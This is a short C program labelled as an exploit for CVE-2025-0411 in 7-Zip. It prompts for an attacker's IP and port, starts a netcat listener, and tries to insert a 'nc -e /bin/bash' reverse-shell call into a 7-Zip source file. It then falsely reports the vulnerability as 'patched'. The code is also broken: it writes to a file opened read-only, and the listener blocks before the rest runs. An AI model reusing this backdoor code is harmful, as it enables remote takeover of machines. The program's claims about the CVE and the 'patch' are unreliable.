//run on Linux: gcc 7-zip_cve-2025-0411.c -o 7-zip_cve-2025-0411  |  ./7-zip_cve-2025-0411

#include <stdio.h>
#include <stdlib.h>

// Replace with the actual file path of the 7-Zip source code
#define SOURCE_FILE "CPP/7zip/Archive/7z/7zCompressionMode.h"

int main() {
    char attackerIP[100];
    char attackerPort[10];
    char listeningPort[10];

    printf("Enter the attacker's IP address: ");
    fgets(attackerIP, sizeof(attackerIP), stdin);
    attackerIP[strcspn(attackerIP, "\n")] = 0; // Remove the newline character

    printf("Enter the attacker's port: ");
    fgets(attackerPort, sizeof(attackerPort), stdin);
    attackerPort[strcspn(attackerPort, "\n")] = 0; // Remove the newline character

    printf("Enter the listening port: ");
    fgets(listeningPort, sizeof(listeningPort), stdin);
    listeningPort[strcspn(listeningPort, "\n")] = 0; // Remove the newline character

    // Start the listener
    char listenerCommand[1024];
    sprintf(listenerCommand, "nc -lvp %s", listeningPort);
    system(listenerCommand);

    FILE *file = fopen(SOURCE_FILE, "r");
    if (file == NULL) {
        printf("Failed to open the source file.\n");
        return 1;
    }

    char line[1024];
    char modifiedLine[1024];
    int found = 0;

    while (fgets(line, sizeof(line), file) != NULL) {
        if (strstr(line, "if (method == 0)") != NULL) {
            found = 1;
            sprintf(modifiedLine, "if (method == 0) {\n  system(\"nc -e /bin/bash %s %s\");\n  return new NMethod::Copy();\n}\n", attackerIP, attackerPort);
            fputs(modifiedLine, file);
        } else {
            fputs(line, file);
        }
    }

    fclose(file);

    if (found) {
        printf("Vulnerability patched successfully.\n");
    } else {
        printf("Failed to find the target line in the source file.\n");
    }

    return 0;
}
